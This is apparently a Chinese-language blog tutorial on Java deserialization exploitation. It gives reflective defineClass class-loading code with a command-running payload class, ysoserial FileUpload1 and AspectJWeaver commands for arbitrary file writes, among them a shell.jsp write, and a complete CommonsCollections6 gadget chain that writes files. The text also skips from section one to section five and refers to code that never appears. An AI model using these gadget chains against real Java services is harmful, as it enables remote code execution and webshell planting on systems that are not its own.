在很多反序列化漏洞中，除了直接执行Runtime.getRuntime().exec()之外，我们往往要考虑如何执行任意类的问题，通常有以下解决方法。

一、    defineClass
此为最常见的动态加载字节码的方法，在java反序列化实战中有提及。用法如下

package test;import java.io.FileInputStream;import java.lang.reflect.Method;
public class DefineClass {    public static void main(String[] args) throws Exception {        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);        defineClass.setAccessible(true);        FileInputStream inputFromFile = new FileInputStream("C:\\Users\\Administrator.K\\workspace\\javareadobject\\bin\\test\\Calc.class");        byte[] bs = new byte[inputFromFile.available()];        inputFromFile.read(bs);        Class evil = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), "test.Calc", bs, 0, bs.length);        evil.newInstance();    }}

Calc.class

package test;
public class Calc {    static {        try {            Runtime.getRuntime().exec("calc");        } catch (Exception e) {        }    }}

但是其为protected属性，无法直接使用，需要setAccessible(true)，因此常常用其他重写了此方法的类来代替，比如js.jar中的org.mozilla.classfile.DefiningClassLoader，结合CC6代码如下。

JNDI需求外网用起来比较复杂，而且还受着JDK版本限制，有两种方法突破JDK版本限制。
一种是反序列化，也就是ysoserial支持的方法。

但ysoserial不支持ldap，实际上ldap也可以反序列化，因此JNDI和反序列化可以互相触发。
另一种是加载本地Factory类，常见tomcat的org.apache.naming.factory.BeanFactory类，通过el表达式执行命令。
详情见https://xz.aliyun.com/t/8214

五、    Fileupload

在java项目更新对反序列化链围追堵截的年代，很多时候执行任意类不行，Runtime.getRuntime().exec()也不行，就只能退而求其次尝试别的办法了。

比如ysoserial中存在FileUpload1和AspectJWeaver这一老一旧的任意文件写入链。

FileUpload1要求commons-fileupload-1.3.jar和commons-io-2.4.jar，在JDK1.6版本可以利用00截断来实现任意文件写入。此链偶尔活跃在weblogic T3反序列化漏洞比如CVE-2018-2628，因为weblogic 10g还用的是JDK1.6。

java -jar ysoserial.jar FileUpload1 "writeOld;shell.jsp;test"

但在JDK1.7或者以上版本，就只能向任意目录(必须是已存在的)写入一个tmp后缀文件。

java -jar ysoserial.jar FileUpload1 "write;src;test"


AspectJWeaver要求commons-collections-3.2.2.jar和aspectjweaver-1.9.6.jar，常见于近期流行的spring项目中。

java -jar ysoserial.jar AspectJWeaver "ahi.txt;YWhpaGloaQ=="


比如fastjson在1.2.68后期也只能追求文件写入，ssrf java ntlm中继等方法进行RCE。
https://b1ue.cn/archives/364.html

当然，CC链也是可以写文件的，代码如下。

package test;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;

public class FileuploadCC6 {    public static void main(String[] args) throws Exception {        //FileOutputStream.class.getDeclaredConstructor(String.class).newInstance("1.txt").write("qwe".getBytes());        Transformer Testtransformer = new ChainedTransformer(new Transformer[]{});        Transformer[] transformers=new Transformer[]{                new ConstantTransformer(FileOutputStream.class),                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{"1.txt"}}),                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{"test".getBytes()})        };        Map map=new HashMap();        Map lazyMap=LazyMap.decorate(map,Testtransformer);        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test1");        HashSet hashSet=new HashSet(1);        hashSet.add(tiedMapEntry);        lazyMap.remove("test1");        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");        field.setAccessible(true);        field.set(Testtransformer, transformers);        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("1.ser"));        objectOutputStream.writeObject(hashSet);        objectOutputStream.close();        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("1.ser"));        objectInputStream.readObject();    }}

反射代码如下，由于所有写文件的类去new的时候都需要入参，所以必须用到getDeclaredConstructor。

FileOutputStream.class.getDeclaredConstructor(String.class).newInstance("1.txt").write("qwe".getBytes());

getDeclaredConstructor是获取构造器，创建对象的时候如果创建的对象有参数就必须要使用这个方法，要输入传参规格，然后再newInstance的时候，就可以传参了，在使用getDeclaredConstructor时，InvokerTransformer去设置传参规格的时候也要注意这点。
